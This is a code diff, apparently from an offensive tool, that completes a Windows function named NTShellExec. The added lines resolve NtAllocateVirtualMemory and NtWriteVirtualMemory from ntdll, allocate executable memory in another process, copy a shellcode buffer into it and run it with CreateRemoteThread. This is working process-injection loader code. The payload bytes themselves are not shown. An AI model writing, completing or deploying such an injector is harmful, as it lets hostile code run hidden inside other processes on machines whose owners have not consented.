@@ -40,16 +40,57 @@ int NTShellExec(DWORD process_id){
     LPNTALLOCATEVIRTUALMEMORY ptrAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
 
     if(ptrAllocateVirtualMemory == NULL){
-        printf("enable to get ptr to NtAllocateVirtualMemory with error : %zd", GetLastError());
+        printf("unable to get ptr to NtAllocateVirtualMemory with error : %zd", GetLastError());
     }
 
     //params
     PVOID rBuffer = NULL;
     PSIZE_T sizeShellCode = sizeof(shellcode_x64);
 
-    NTSTATUS AVMstatus = ptrAllocateVirtualMemory(hProcess, rBuffer, NULL, &sizeShellCode,(MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+    //allocate memory buffer
+    NTSTATUS AVMstatus = ptrAllocateVirtualMemory(hProcess, &rBuffer, NULL, &sizeShellCode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-    //do something
+    if(AVMstatus != STATUS_SUCCESS){
+        printf("unable to alloc memory...");
+        return EXIT_FAILURE;
+    }
+
+
+    //ptr to WriteVirtualMemory
+    LPWRITEVIRTUALMEMORY ptrWriteVirtualMemory = (LPWRITEVIRTUALMEMORY)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");
+
+    if(ptrWriteVirtualMemory == NULL){
+        printf("unable to get ptr to NtWriteVirtualMemory with error : %zd \n", GetLastError());
+    }
+
+
+    //write memory
+    NTSTATUS WVMstatus = ptrWriteVirtualMemory(hProcess, rBuffer, shellcode_x64, (SIZE_T)(sizeof(shellcode_x64)), NULL);
+
+    if(WVMstatus != STATUS_SUCCESS){
+        printf("unable to write memory... \n");
+        return EXIT_FAILURE;
+    }
+
+    printf("wrote %zd-bytes to allocated process memory\n", sizeof(shellcode_x64));
+
+    LPDWORD thread_id = NULL;
+
+    //creating thread to run payload
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, thread_id);
+
+    if(hThread == NULL){
+        printf("unable to get handle to new thread with error : %ld", GetLastError());
+        return EXIT_FAILURE;
+    }
+
+    printf("%s waiting for thread to finish executing\n");
+    WaitForSingleObject(hThread, INFINITE);
+    printf("%s thread finished executing, cleaning up\n");
+
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    printf("%s operation successfully made>>>>");
 
     //free(sizeShellCode)
     return EXIT_SUCCESS;
